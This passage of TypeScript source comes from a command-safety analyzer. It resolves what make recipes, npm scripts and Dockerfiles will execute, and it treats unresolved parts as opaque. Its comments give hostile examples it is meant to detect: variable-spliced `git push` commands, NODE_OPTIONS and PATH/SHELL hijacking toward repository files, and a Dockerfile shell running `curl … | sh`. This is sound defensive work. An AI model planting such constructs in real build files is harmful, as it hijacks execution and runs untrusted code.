    return tokens.some((t) => /^-{0,2}[a-zA-Z-]*x/.test(t) && !t.startsWith('--exclude'));
  if (/^(unzip|7z|7za|unrar|bsdcpio|cpio)$/.test(head)) return true;
  if (/^(rsync|cp)$/.test(head) && tokens.some((t) => /^-[a-zA-Z]*[ra]/.test(t))) return true;
  if (head === 'git' && tokens.includes('checkout-index')) return true;
  return false;
}

/** True when the path exists on disk, whatever our ability to read it. */
function fileExists(abs: string): boolean {
  try {
    statSync(abs);
    return true;
  } catch {
    return false;
  }
}

/* ------------------------------------------------------------------------------------------------------------- *
 * RESOLUTION OUTCOME — "positive security claims must be earned" (product decision, 2026-09-22).
 *
 * A parser failing to find something is NOT proof that it does not exist. "NOT ANALYZED" and "PROVEN ABSENT" are
 * different states, and only one of them may keep a declared class's ALLOW. Before this type there was a single
 * boolean-ish `missing | unread`, and every gap between a producer's grammar and the real tool landed in the
 * friendly half: an unparsed make construct read exactly like a target that does not exist, so the analyzer's own
 * blind spot was routed into the one state that fails OPEN.
 * ------------------------------------------------------------------------------------------------------------- */

export type ResolutionOutcome =
  /** everything that will execute was located, read and handed over */
  | 'RESOLVED_COMPLETE'
  /** PROVEN that nothing will execute — the source was fully read and genuinely does not define this target */
  | 'ABSENT_VERIFIED'
  /** part of what will execute was resolved; the rest was not */
  | 'PARTIAL'
  /** the source uses constructs this resolver does not model */
  | 'UNSUPPORTED'
  /** the source exists but could not be read */
  | 'UNREADABLE'
  /** the target, path or command is built at runtime */
  | 'DYNAMIC'
  /** resolved correctly, but the source may have been rewritten before the effect executes */
  | 'STALE'
  /** the execution context the conclusion depends on was not proven */
  | 'CONTEXT_UNVERIFIED'
  /** an implicit producer attached to repository state (git hooks, dependency install scripts) was not resolved */
  | 'AMBIENT_UNRESOLVED'
  /** PROVEN: this head introduces no executable closure beyond what its arguments name (authored vocabulary) */
  | 'NOT_A_PRODUCER'
  /** this head DISCOVERS and executes content EGO has not been shown — test files, a config and its plugins,
   *  another package's scripts — and EGO does not model that closure. The silence of a producer lookup table is
   *  not proof that nothing else runs (challenge 7, UNCLAIMED-HEAD CLOSURE). */
  | 'UNKNOWN_PRODUCER';

/**
 * INFORMATION MONOTONICITY. Less verified information must never produce a more permissive verdict, so the two
 * states that carry a positive claim are named here ONCE and every other state — including any added later —
 * falls to the opaque side by construction. `analyzeBody` is independent: a PARTIAL resolution still hands over
 * what it did resolve, and the unresolved remainder is reported separately rather than swallowing the rest.
 */
export function resolutionEffect(outcome: ResolutionOutcome): { proven: boolean; opaque: boolean } {
  switch (outcome) {
    case 'RESOLVED_COMPLETE':
    case 'ABSENT_VERIFIED':
    case 'NOT_A_PRODUCER':
      return { proven: true, opaque: false };
    default:
      return { proven: false, opaque: true };
  }
}

/** How much verified information an outcome carries. Used by the monotonicity property test; never by policy. */
export const INFORMATION_RANK: Record<ResolutionOutcome, number> = {
  RESOLVED_COMPLETE: 2,
  ABSENT_VERIFIED: 2,
  PARTIAL: 1,
  STALE: 1,
  UNSUPPORTED: 0,
  UNREADABLE: 0,
  DYNAMIC: 0,
  CONTEXT_UNVERIFIED: 0,
  AMBIENT_UNRESOLVED: 0,
  NOT_A_PRODUCER: 2,
  UNKNOWN_PRODUCER: 0,
};

/** A cheap content fingerprint, so a resolution can be invalidated when its source changes (freshness, A4). */
function fingerprint(text: string): string {
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193;
  for (let i = 0; i < text.length; i++) {
    h1 = Math.imul(h1 ^ text.charCodeAt(i), 0x01000193);
    h2 = Math.imul(h2 + text.charCodeAt(i), 0x85ebca6b) ^ (h2 >>> 13);
  }
  return ((h1 >>> 0).toString(16) + (h2 >>> 0).toString(16)).padStart(16, '0');
}

/** A manifest we could not read: UNREADABLE when it is there, ABSENT_VERIFIED when it provably is not. */
function manifestUnresolved(
  ctx: EvaluationContext,
  abs: string | null,
  key: string,
  what: string,
): ProducerResult {
  const exists = abs !== null && fileExists(abs);
  return {
    kind: 'npm-script',
    key,
    body: null,
    reason: exists ? `${what} present but not readable` : `no ${what}`,
    resolution: exists ? 'UNREADABLE' : 'ABSENT_VERIFIED',
  };
}

/** THE PRODUCER CONTRACT (product decision, 2026-09-22 — "security true by construction").
 *
 *  A producer — make, a package script, a shell script, an ambient producer, and any producer added later — MAY:
 *    - resolve WHICH bodies will execute, explicit and ambient;
 *    - resolve the execution context those bodies run in;
 *    - report how COMPLETE, FRESH and PROVEN that resolution is (`resolution`);
 *    - provide structured provenance and a fingerprint for what it inspected;
 *    - report inability to resolve.
 *
 *  A producer MAY NOT:
 *    - emit ALLOW/ASK/DENY, or decide a body is safe;
 *    - discard executable content before canonical analysis;
 *    - map its own parser failure to a friendly absence without proof;
 *    - weaken a nested effect, or hide analysis truncation.
 *
 *  Enforced structurally rather than by convention: this type has NO field that can carry a verdict, a capability
 *  or a hit, and `resolution` is REQUIRED — a producer cannot omit its completeness state, and every value except
 *  the two proven ones is opacity. `packages/kernel/test/producer-contract.test.ts` pins the rest. */
export interface ProducerResult {
  /** TYPED DISPATCH. `none` means NO REGISTERED PRODUCER CLAIMS THIS HEAD — a structural fact about the producer
   *  table, not a claim about what will execute. It is the only honest use of "nothing here", and it is decided by
   *  a table lookup rather than by a producer giving up. A producer that DOES claim the head must return a
   *  resolution state; it may not fall back to an untyped `null` channel that silently meant ABSENT_VERIFIED
   *  (challenge 6, finding 28). */
  kind: 'shell-script' | 'npm-script' | 'make-target' | 'git-ambient' | 'none';
  /** True when this producer's bodies run INSIDE a container image, so their paths are the image's. */
  containerPaths?: boolean;
  /** execution IDENTITY for the cycle guard: everything that makes this a distinct execution — the directory, the
   *  makefile or manifest actually read, and the target. A bare name collided across directories and across
   *  `-f other.mk` (challenge 4, findings 20, 34). */
  key: string;
  /** what was inspected to reach this conclusion, and its fingerprint, so a stale resolution can be detected */
  provenance?: { source: string; fingerprint: string };
  /** the VERBATIM executable units. A producer may not filter, simplify or drop any of it. */
  body: string[] | null;
  reason: string;
  /** The execution context the BODY's relative operands resolve against. `make -C sub` runs its recipe in `sub`;
   *  an npm script runs in the manifest's directory; a shell script runs in the caller's directory. */
  bodyEnv?: ExecutionEnvironment;
  /** SCOPED OPACITY: exactly which parts of the execution closure are unresolved. A PARTIAL result says what is
   *  missing rather than declaring the whole operation unknown. */
  unresolved?: Unresolved[];
  /** How complete/fresh/proven this resolution is. REQUIRED: only RESOLVED_COMPLETE and ABSENT_VERIFIED carry a
   *  positive claim; everything else is opacity at every depth. */
  resolution: ResolutionOutcome;
  /** true when the body is ONE shell (a script) rather than independent shells (make recipe lines, npm pre/post) */
  oneShell?: boolean;
}

/* ---------------------------------------------- GNU make subset ---------------------------------------------- */

interface MakeRule {
  recipes: string[];
  prereqs: string[];
}
interface MakeFileModel {
  rules: Map<string, MakeRule>;
  firstTarget: string | null;
  defaultGoal: string | null;
  oneShell: boolean;
  /** constructs that affect the WHOLE file, so no conclusion drawn from it is complete ($(eval), VPATH, an
   *  include this resolver could not read or whose path is computed) */
  unsupported: string[];
  /** constructs that affect ONLY the targets defined under them, chiefly conditionals. Attributing these to the
   *  whole file made one `ifeq` or one `%.o:` rule gate every unrelated target — a proportionality break, not a
   *  security property (challenge 6, findings 22 and 27). */
  unsupportedFor: Map<string, string[]>;
  /** true when the file has pattern rules, which can build a target no literal rule defines: it bears only on
   *  whether ABSENCE can be proven, never on a target whose own recipe was read */
  hasPatternRules: boolean;
  /** `target: VAR = value` — make's TARGET-SPECIFIC variable, which overrides the global one for that target's
   *  recipes and for everything it is a prerequisite of. */
  targetVars: Map<string, Map<string, string>>;
  /** the names assigned with `override`, whose makefile value WINS over a command-line assignment. */
  overridden: Set<string>;
  /** Every value a name is given inside a CONDITIONAL. The resolver cannot always evaluate the condition, so
   *  each branch's value is a candidate and the recipe is expanded with each of them. */
  altVars: Map<string, Set<string>>;
  /** `export NAME := value` — the names the makefile puts in EVERY recipe's environment. `export PGHOST :=
   *  prod-db.acme.com` makes the recipe's `psql` connect to production, and `export NODE_OPTIONS :=
   *  --require=./evil.js` makes every Node tool in every recipe load that file; the recipe text says neither
   *  (exit review 8). */
  exported: Map<string, string>;
  /** `%.o: %.c` — an IMPLICIT rule, which builds a target no literal rule names. Recording only the FLAG that
   *  the file has some made every pattern-built prerequisite an opacity; keeping the rules lets the one that
   *  matches be resolved like any other recipe (exit review 7). */
  patternRules: Array<{ target: string; prereqs: string[]; recipes: string[] }>;
  /** CONFIGURATION CLOSURE + BINDING: assignments that change WHICH PROGRAM a recipe line runs, rather than what
   *  the line says. `SHELL := ./bin/badsh` and `export PATH := ./bin:$(PATH)` both make every command in every
   *  recipe mean something else, while the recipe text stays honest (challenge 6, findings 18, 24). */
  rebinds: string[];
  /** every variable this resolver could read, so a recipe's `$(VAR)` is substituted with the VALUE make will
   *  splice in rather than guessed at. A value carrying `;`, `&&` or `|` really does become new commands — the
   *  shell's own `$VAR` is not re-parsed for operators, and importing that reasoning into make was false. */
  vars: Map<string, string>;
  /** commands make RUNS WHILE PARSING — every `$(shell …)` outside a recipe. They run for any target, and for
   *  `make -n`, so they belong to the body of whatever was asked for (exit review 4). */
  parseRan: string[];
  sources: string[];
  text: string;
}

/** True when a SHELL / .SHELLFLAGS / PATH assignment names the ordinary thing rather than re-pointing execution:
 *  a system shell at a standard absolute path, ordinary shell flags, or a PATH that only APPENDS system
 *  directories. Anything relative, anything inside the repository, and anything built from a variable is a
 *  rebinding. */
function isOrdinaryShellAssignment(name: string, value: string): boolean {
  const v = value.trim().replace(/\s*#.*$/, '');
  if (name === 'SHELL')
    return /^\/(bin|usr\/bin|usr\/local\/bin)\/(sh|bash|zsh|dash|ksh|ash)$/.test(v) || /^(sh|bash|zsh|dash|ksh)$/.test(v);
  if (name === '.SHELLFLAGS') return /^-[a-zA-Z]+(\s+-[a-zA-Z]+)*$/.test(v);
  // PATH: ordinary only when every NEW entry is an absolute system directory
  // AN EMPTY ENTRY IN PATH IS THE CURRENT DIRECTORY. `export PATH := :$(PATH)` puts the checkout first, so every
  // bare program name the recipe uses resolves to a repository file — and filtering empties away made the list
  // of NEW entries empty, which `every` calls ordinary (exit review 8).
  const parts = v.replace(/\$[({]?PATH[)}]?/g, '\0').split(':');
  if (parts.some((q, i) => q.trim() === '' && !(parts.length > 1 && i === parts.length - 1 && v.trimEnd().endsWith('\0'))))
    return false;
  const added = parts.filter((p) => p.trim().length > 0 && p.trim() !== '\0');
  // ...AND AN ENTRY IS JUDGED ON WHAT IT RESOLVES TO. `/usr/../tmp/evilbin` begins with `/usr` and IS `/tmp`,
  // so a writable directory anyone can plant a `cc` in was read as a system directory (exit review 7).
  return added.every((p) => {
    const t = p.trim();
    return /^\/(usr|opt|bin|sbin|Library|System)\b/.test(t) && /^\/(usr|opt|bin|sbin|Library|System)\b/.test(resolve(t));
  });
}

/** Images whose ENTRYPOINT is a tool this kernel models, so the container's argv IS that tool's command line.
 *  Deliberately a short, named list: the argv of an arbitrary image is not a command line, and guessing would
 *  gate every `docker run myapp --port 8080`. */
const CLI_IMAGES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(^|\/)(amazon\/aws-cli|aws-cli\/aws-cli)$/i, 'aws'],
  [/(^|\/)hashicorp\/vault$/i, 'vault'],
  [/(^|\/)hashicorp\/terraform$/i, 'terraform'],
  [/(^|\/)(google\/cloud-sdk|cloudsdktool\/[a-z-]+)$/i, 'gcloud'],
  [/(^|\/)(azure-cli|azuresdk\/azure-cli-python)$/i, 'az'],
  [/(^|\/)(bitnami\/kubectl|rancher\/kubectl|lachlanevenson\/k8s-kubectl)$/i, 'kubectl'],
  [/(^|\/)(alpine\/helm|dtzar\/helm-kubectl)$/i, 'helm'],
];
/** An image REFERENCE without its registry-agnostic decorations: the tag or digest is stripped, so
 *  `docker.io/amazon/aws-cli@sha256:…` and `amazon/aws-cli:2.15` are the same image as `amazon/aws-cli`.
 *  Anchoring the patterns to the bare name was a way to spell the image that the rule did not recognise. */
function imageName(ref: string): string {
  return ref.replace(/@sha256:[0-9a-f]+$/i, '').replace(/:[^/:]+$/, '');
}
/** docker/podman run options that consume the next token, so their value is not the image name. */
const DOCKER_RUN_VALUE_OPTS =
  /^(-e|--env|--env-file|-v|--volume|--mount|-p|--publish|--name|-w|--workdir|-u|--user|--entrypoint|--network|--net|--add-host|--label|-l|--log-driver|--log-opt|--restart|--memory|-m|--cpus|--cpu-shares|--device|--dns|--hostname|-h|--platform|--pull|--health-cmd|--security-opt|--cap-add|--cap-drop|--tmpfs|--ulimit|--sysctl|--shm-size|--pid|--ipc|--uts|--userns|--cgroupns|--runtime|--attach|-a|--detach-keys|--stop-signal|--stop-timeout|--storage-opt|--volumes-from|--link|--expose|--gpus)$/;

/** docker/buildx build options that consume the next token, so their value is not the build context. */
const DOCKER_BUILD_VALUE_OPTS =
  /^(-f|--file|-t|--tag|--build-arg|--label|--target|--platform|--cache-from|--cache-to|--output|-o|--secret|--ssh|--network|--add-host|--progress|--builder|--iidfile|--metadata-file|--attest|--provenance|--sbom|--allow|--ulimit|--shm-size|--cpu-shares|--memory|--isolation)$/;

/** The lines of a Dockerfile that `docker build` EXECUTES: every `RUN`, and nothing else. `CMD` and `ENTRYPOINT`
 *  are metadata recorded in the image and run at `docker run`, not at build time — analysing them gated every
 *  ordinary Node Dockerfile on its own `CMD ["node","dist/index.js"]`. A JSON-array form (`RUN ["a","b"]`) is an
 *  exec without a shell, so its argv is joined into one command line rather than parsed as shell. Continuations
 *  are joined first, because a `RUN` line may span many physical lines. */
function dockerfileShellLines(text: string): string[] {
  // A COMMENT LINE IS REMOVED BEFORE CONTINUATIONS ARE JOINED. Docker strips comment lines first, so a trailing
  // backslash in a comment joins NOTHING — but this reader joined continuations first, so `# helper \` swallowed
  // the `RUN` beneath it and that line became invisible (exit review 8). The `# syntax=` directive is kept,
  // because it is the one comment that changes what the file MEANS.
  text = text
    .split('\n')
    .filter((l) => !/^\s*#/.test(l) || /^\s*#\s*syntax\s*=/i.test(l))
    .join('\n');
  // `RUN <<EOF … EOF` is BuildKit's heredoc form: the body is the script the shell runs, exactly as it is for
  // `bash <<EOF` (exit review 8, self-attack).
  text = text.replace(/^[ \t]*(?:ONBUILD[ \t]+)?RUN[ \t]+(?:--\S+[ \t]+)*<<-?["']?(\w+)["']?[^\n]*\n([\s\S]*?)\n[ \t]*\1[ \t]*$/gim,
    (_m, _d: string, body: string) => body.split('\n').map((l) => `RUN ${l}`).join('\n'));
  const joined = text.replace(/\\\r?\n\s*/g, ' ');
  const out: string[] = [];
  for (const raw of joined.split('\n')) {
    const line = raw.replace(/^\s+/, '');
    if (!line) continue;
    // `SHELL ["/x","-c"]` RE-POINTS EVERY LATER `RUN` at that program, exactly as a makefile's `SHELL :=` does,
    // so the recipe text below it is not what determines the effect. `ONBUILD RUN …` records a command the CHILD
    // build runs; EGO can read it here and nowhere else, so it is classified here (exit review 8, self-attack).
    // `# syntax=<image>` makes BuildKit pull that image and let IT interpret the whole file, so the RUN lines
    // read here decide nothing at all (exit review 8).
    const syn = /^#\s*syntax\s*=\s*(\S+)/i.exec(line);
    if (syn) {
      out.push(`${MARK}dockerfile-shell frontend ${syn[1]!}`);
      continue;
    }
    if (line.startsWith('#')) continue;
    const sh = /^SHELL\s+(.+)$/i.exec(line);
    if (sh) {
      // THE WHOLE ARRAY IS THE SHELL, not its first element: `SHELL ["/bin/sh","-c","curl … | sh"]` puts an
      // ordinary interpreter in front of a payload that then runs before every later RUN (exit review 8).
      const argv = [...sh[1]!.matchAll(/"((?:[^"\\]|\\.)*)"/g)].map((m) => m[1]!);
      const prog = argv[0] ?? sh[1]!.trim().split(/\s+/)[0]!;
      const ordinary =
        (/^\/(bin|usr\/bin|usr\/local\/bin)\/(sh|bash|zsh|dash|ksh|ash)$/.test(prog) ||
          /^(sh|bash|zsh|dash|ksh|cmd|powershell|pwsh)$/.test(prog)) &&
        argv.slice(1).every((a) => /^-[a-zA-Z]+$/.test(a));
      if (!ordinary) out.push(`${MARK}dockerfile-shell ${argv.length > 1 ? argv.join(' ') : prog}`);
      continue;
    }
    const m = /^(?:ONBUILD\s+)?RUN\s+([\s\S]*)$/i.exec(line);
    if (!m) continue;
    let body = m[1]!.trim();
    // `RUN --mount=… cmd` and friends: the flags are the builder's, not the command's
    body = body.replace(/^(--[a-z-]+(=\S*)?\s+)*/i, '');
    const json = /^\[([\s\S]*)\]$/.exec(body);
    if (json) {
      try {
        const argv = JSON.parse(`[${json[1]!}]`) as unknown[];
        if (Array.isArray(argv) && argv.every((a) => typeof a === 'string')) {
          out.push(requote(argv as string[]));
          continue;
        }
      } catch {
        /* not JSON after all: fall through and treat it as shell */
      }
    }
    if (body) out.push(body);
  }
  return out;
}

/** The entries of a directory, or null when it cannot be read. A pattern whose directory is unreadable is a gap,
 *  not an empty set — the same rule the rest of this resolver follows for a positive claim. */
function listDirectory(dir: string): string[] | null {
  try {
    return readdirSync(dir);
  } catch {
    return null;
  }
}

/** make functions whose RESULT is text this resolver does not evaluate. Naming them is what makes an UNKNOWN
 *  function name opaque rather than text: positive claims must be earned here too. */
const MAKE_TEXT_FUNCTIONS = new Set([
  ...['subst', 'patsubst', 'strip', 'findstring', 'filter', 'filter-out', 'sort', 'word', 'wordlist', 'words'],
  ...['firstword', 'lastword', 'dir', 'notdir', 'suffix', 'basename', 'addsuffix', 'addprefix', 'join'],
  ...['wildcard', 'realpath', 'abspath', 'if', 'or', 'and', 'foreach', 'call', 'value', 'origin', 'flavor'],
  ...['error', 'warning', 'info', 'eval', 'file', 'let', 'intcmp'],
]);

/**
 * THE TEXT MAKE HANDS TO THE SHELL, and the commands it RUNS to get there.
 *
 * GNU make owns the `$` in a makefile. It expands its OWN `$(…)`, `${…}` and `$@`-style references and gives the
 * RESULT to `$(SHELL) -c`; `$$` is how a line writes one literal `$` FOR the shell. Handing the PRE-IMAGE to the
 * shell analyzer was wrong in both directions at once (exit review 4):
 *   - it OVER-gated, reading `echo $(VERSION)` as a command substitution of a command named VERSION;
 *   - it UNDER-gated, and that is the serious half. A variable's value is spliced in BEFORE the shell parses the
 *     line, so `EVIL := ; git push origin main` with a recipe `echo $(EVIL)` really does run the push. The shell's
 *     own `$VAR` is NOT re-parsed for control operators, and importing that reasoning into make made this ALLOW.
 *   - and `$(shell C)` RUNS C while make expands, for any target and even for `make -n`.
 * A single left-to-right scanner is the only shape that gets `$$` right: a chain of replacements cannot consume it
 * as a unit, so `$$$(shell …)` — which real make executes — slips through one of the passes.
 */
export function expandMakeText(
  text: string,
  vars: Map<string, string>,
  auto: Record<string, string> = {},
  depth = 0,
): { text: string | null; prefix: string; ran: string[] } {
  const ran: string[] = [];
  if (depth > 8) return { text: null, prefix: '', ran };
  let out = '';
  let prefix = ''; // what was determined BEFORE the first unknown: the head and the arguments up to it
  let opaque = false;
  // A REFERENCE INSIDE DOUBLE QUOTES CANNOT INTRODUCE OPERATORS. make splices the value in before the shell parses
  // the line, which is why an UNQUOTED reference really can carry a `;` and become new commands — but inside
  // quotes the same value is one word. Without this distinction the single most common release makefile,
  // `VERSION := $(shell git describe)` with `echo "building $(VERSION)"`, was opaque and asked (exit review 5).
  let inDouble = false;
  const unknownHere = (): void => {
    if (inDouble) out += '$MAKEVAR';
    else opaque = true;
  };
  const nameOnly = (v: string): string => v.slice(v.lastIndexOf('/') + 1);
  const dirOnly = (v: string): string => (v.includes('/') ? v.slice(0, v.lastIndexOf('/')) : '.');
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (ch === '\\' && text[i + 1] !== undefined) {
      out += ch + text[i + 1]!;
      if (!opaque) prefix = out;
      i++;
      continue;
    }
    if (ch === '"') inDouble = !inDouble;
    if (ch !== '$') {
      out += ch;
      if (!opaque) prefix = out;
      continue;
    }
    const next = text[i + 1];
    if (next === '$') {
      out += '$'; // make emits ONE literal `$`: what follows is the SHELL's, so `$$(cmd)` is a substitution
      i++;
      continue;
    }
    if (next === undefined) {
      out += ch;
      continue;
    }
    if (next !== '(' && next !== '{') {
      const single = auto[next];
      if (single !== undefined) {
        out += single;
        if (!opaque) prefix = out;
        i++;
        continue;
      }
      const v = vars.get(next);
      if (v === undefined) unknownHere();
      else {
        const inner = expandMakeText(v, vars, auto, depth + 1);
        ran.push(...inner.ran);
        if (inner.text === null) unknownHere();
        else out += inner.text;
      }
      i++;
      continue;
    }
    const close = next === '(' ? ')' : '}';
    let d = 0;
    let j = i + 1;
    for (; j < text.length; j++) {
      if (text[j] === next) d++;
      else if (text[j] === close && --d === 0) break;
    }
    const body = text.slice(i + 2, j);
    i = j;
    const fn = /^([A-Za-z-]+)[ \t]+([\s\S]*)$/.exec(body);
    if (fn && (fn[1] === 'shell' || fn[1] === 'guile')) {
      // make RUNS this while expanding: the command is real execution, and the text it produces is not knowable
      const cmd = expandMakeText(fn[2]!, vars, auto, depth + 1);
      ran.push(...cmd.ran);
      if (cmd.text !== null && cmd.text.trim()) ran.push(cmd.text.trim());
      unknownHere(); // the command RAN; what it printed is not knowable
      continue;
    }
    if (fn && MAKE_TEXT_FUNCTIONS.has(fn[1]!)) {
      const arg = expandMakeText(fn[2]!, vars, auto, depth + 1); // a nested $(shell …) is still found
      ran.push(...arg.ran);
      unknownHere(); // the function's RESULT is not evaluated here
      continue;
    }
    const autoRef = /^([@<^+*?%])([DF])?$/.exec(body.trim());
    if (autoRef) {
      const v = auto[autoRef[1]!];
      if (v === undefined) unknownHere();
      else out += autoRef[2] === 'D' ? dirOnly(v) : autoRef[2] === 'F' ? nameOnly(v) : v;
      continue;
    }
    const name = body.trim();
    const value = vars.get(name);
    if (value !== undefined) {
      const inner = expandMakeText(value, vars, auto, depth + 1);
      ran.push(...inner.ran);
      if (inner.text === null) unknownHere();
      else {
        out += inner.text;
        if (!opaque) prefix = out;
      }
      continue;
    }
    // A VARIABLE THIS RESOLVER NEVER SAW DEFINED IS NOT PROVABLY EMPTY. make imports the whole environment and
    // accepts `make VAR=…` on the command line, so an undefined-looking name can carry anything at run time —
    // expanding it to nothing would turn a dynamic recipe into a proven-harmless one, which is the unearned
    // positive claim this kernel exists to refuse.
    unknownHere();
  }
  return { text: opaque ? null : out, prefix, ran };
}

/** Joins backslash continuations OUTSIDE recipe lines; a recipe's continuation stays one logical shell line. */
function makeLogicalLines(text: string): string[] {
  const raw = text.split(/\r?\n/);
  const out: string[] = [];
  for (let i = 0; i < raw.length; i++) {
    let line = raw[i]!;
    while (/\\$/.test(line) && i + 1 < raw.length) {
      // GNU make joins the continuation; inside a recipe the backslash-newline is handed to ONE shell, so the
      // joined text must stay a single line (challenge 5, finding 18: splitting it relocated relative paths).
      const next = raw[++i]!;
      line = line.replace(/\\$/, '') + (line.startsWith('\t') ? next.replace(/^\t/, ' ') : ' ' + next.trim());
    }
    out.push(line);
  }
  return out;
}

/**
 * Parses the subset of GNU make EGO models, following `include` directives and recording every construct it does
 * NOT model. Both branches of a conditional are kept: EGO cannot evaluate the condition, and analysing the union
 * is the safe direction — classifying only the last textually-visible recipe made `make ENV=prod build` ALLOW
 * while make executed the other branch (challenge 5, finding 15).
 */
function parseMakefile(ctx: EvaluationContext, path: string, dir: string, depth = 0): MakeFileModel {
  const model: MakeFileModel = {
    rules: new Map(),
    firstTarget: null,
    defaultGoal: null,
    oneShell: false,
    unsupported: [],
    unsupportedFor: new Map(),
    hasPatternRules: false,
    targetVars: new Map(),
    overridden: new Set(),
    altVars: new Map(),
    exported: new Map(),
    patternRules: [],
    rebinds: [],
    vars: new Map(),
    parseRan: [],
    sources: [],
    text: '',
  };
  // every file this makefile includes, so a rule that REMAKES one — wherever that rule sits in the file — is
  // caught after the parse rather than only when the directive is read
  const included: string[] = [];
  const text = readInsideWorkspace(ctx, path);
  if (text === null) {
    model.unsupported.push(`${path} could not be read`);
    return model;
  }
  model.sources.push(path);
  model.text = text;
  const lines = makeLogicalLines(text);
  let current: MakeRule | null = null;
  const openConditions: string[] = [];
  // `define NAME` … `endef` holds a variable's VALUE. The lines between were fed through the ordinary loop, so
  // an assignment written inside a help text overwrote a live variable (exit review 8).
  let inDefine: { name: string; lines: string[]; override: boolean; exported: boolean; conditional: boolean } | null =
    null;
  // GNU make lets `.RECIPEPREFIX` replace the tab that introduces a recipe line. A parser that only knows the tab
  // sees an EMPTY recipe and reports the target fully resolved — its own gap becoming a positive claim.
  let prefix = '\t';
  for (const line of lines) {
    // a line that starts with the CURRENT recipe prefix is a recipe line, whatever it says: a tab-indented
    // `.RECIPEPREFIX` is a command make hands to the shell, and reading it as a directive changed the prefix so
    // every remaining recipe line of that target became invisible (exit review 5)
    const rp = line.startsWith(prefix) ? null : /^\s*\.RECIPEPREFIX\s*[:+?]?=\s*(\S?)/.exec(line);
    if (rp) {
      prefix = rp[1] || '\t'; // an empty assignment restores the tab
      current = null;
      continue;
    }
    if (line.startsWith(prefix)) {
      if (current) current.recipes.push(line.slice(prefix.length));
      continue;
    }
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    // `define NAME` … `endef` holds a variable's VALUE, not live makefile text. The lines between were fed
    // through the ordinary loop, so an assignment written inside a help text overwrote a live variable and the
    // recipe was analysed with the wrong one (exit review 8).
    if (inDefine !== null) {
      if (/^endef\b/.test(trimmed)) {
        // the body IS the variable's value: `override define CMD` / `git push origin main` / `endef` is the
        // multi-line spelling of an override, and recording only the `=` forms left it invisible (exit review 8)
        const prior = model.vars.get(inDefine.name);
        if (!(inDefine.conditional && prior !== undefined))
          model.vars.set(inDefine.name, inDefine.lines.join('\n').trim());
        if (inDefine.override) model.overridden.add(inDefine.name);
        if (inDefine.exported) model.exported.set(inDefine.name, inDefine.lines.join('\n').trim());
        inDefine = null;
      } else inDefine.lines.push(trimmed);
      continue;
    }
    const defOpen = /^((?:override\s+|export\s+)*)define\s+([A-Za-z_][A-Za-z0-9_.]*)\s*(::?=|[+?!]=|=)?\s*$/.exec(trimmed);
    if (defOpen) {
      inDefine = {
        name: defOpen[2]!,
        lines: [],
        override: /override/.test(defOpen[1]!),
        exported: /export/.test(defOpen[1]!),
        conditional: defOpen[3] === '?=',
      };
      continue;
    }

    // `include a.mk b.mk` — the included rules really execute, so an unreadable one is not "no such target"
    const inc = /^([-s]?)include\s+(.+)$/.exec(trimmed);
    if (inc && !/[$`]/.test(inc[2]!)) included.push(...inc[2]!.split(/\s+/).filter(Boolean));
    if (inc) {
      current = null;
      // `-include` and `sinclude` exist PRECISELY so that a missing file is not an error: make carries on. Marking
      // an absent optional include unsupported gated every ordinary `make build` in a project that generates its
      // dependency files (exit review 5). A file that IS there is still read and still counts.
      const optional = inc[1] === '-' || inc[1] === 's';
      if (/[$`]/.test(inc[2]!)) {
        model.unsupported.push(`include with a computed path: ${trimmed}`);
        continue;
      }
      if (depth >= 3) {
        model.unsupported.push('include nested deeper than this resolver follows');
        continue;
      }
      // A WILDCARD INCLUDE IS AN INCLUDE. `-include *.mk` is the idiom every dependency-generating project uses,
      // and make expands the pattern itself; the resolver read `*.mk` as a literal file name, found nothing, and
      // concluded the goal it did not see was proven absent. `evil.mk` holding `deploy: git push origin main`
      // then ran under a proven-absent claim (exit review 7).
      const names: string[] = [];
      for (const name of inc[2]!.split(/\s+/).filter(Boolean)) {
        if (!/[*?[]/.test(name)) {
          names.push(name);
          continue;
        }
        const globDir = resolve(dir, name.includes('/') ? name.slice(0, name.lastIndexOf('/')) : '.');
        const pattern = name.includes('/') ? name.slice(name.lastIndexOf('/') + 1) : name;
        const prefix = name.includes('/') ? name.slice(0, name.lastIndexOf('/') + 1) : '';
        const re = new RegExp('^' + pattern.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '[^/]') + '$');
        const listed = listDirectory(globDir);
        if (listed === null) {
          model.unsupported.push(`include with a pattern whose directory could not be read: ${trimmed}`);
          continue;
        }
        for (const entry of listed) if (re.test(entry)) names.push(prefix + entry);
      }
      for (const name of names) {
        // AN INCLUDED MAKEFILE THAT IS ITSELF A TARGET IS REMADE, and make then re-executes itself with the new
        // file. What EGO read is a PRE-IMAGE of what will run, so the file it read cannot carry a positive claim
        // (exit review 7).
        if (model.rules.has(name)) model.unsupported.push(`an included makefile is remade by this makefile: ${name}`);
        if (optional && !fileExists(resolve(dir, name))) continue;
        const sub = parseMakefile(ctx, resolve(dir, name), dir, depth + 1);
        for (const [t, r] of sub.rules) {
          const existing = model.rules.get(t);
          if (existing) {
            existing.recipes.push(...r.recipes);
            existing.prereqs.push(...r.prereqs);
          } else model.rules.set(t, { recipes: [...r.recipes], prereqs: [...r.prereqs] });
        }
        for (const [k, v] of sub.vars) model.vars.set(k, v); // an included file's variables are this file's too
        model.parseRan.push(...sub.parseRan);
        model.unsupported.push(...sub.unsupported);
        for (const [t, u] of sub.unsupportedFor)
          model.unsupportedFor.set(t, [...(model.unsupportedFor.get(t) ?? []), ...u]);
        if (sub.hasPatternRules) model.hasPatternRules = true;
        model.rebinds.push(...sub.rebinds);
        model.sources.push(...sub.sources);
        if (sub.defaultGoal) model.defaultGoal = sub.defaultGoal; // make takes the LAST assignment
        if (sub.oneShell) model.oneShell = true;
        if (!model.firstTarget) model.firstTarget = sub.firstTarget;
      }
      continue;
    }
    // constructs whose effect this resolver cannot compute — recorded, never silently ignored
    if (/^(ifeq|ifneq|ifdef|ifndef|else|endif)\b/.test(trimmed)) {
      // make expands the CONDITION while parsing, so a shell function in it runs for every target and for a dry
      // run — and this branch returned before the parse-time collection below ever saw the line (exit review 5)
      for (const c of expandMakeText(trimmed, model.vars).ran) model.parseRan.push(c);
      if (/^endif\b/.test(trimmed)) openConditions.pop();
      else if (/^else\b/.test(trimmed)) openConditions[openConditions.length - 1] = `conditional: ${trimmed}`;
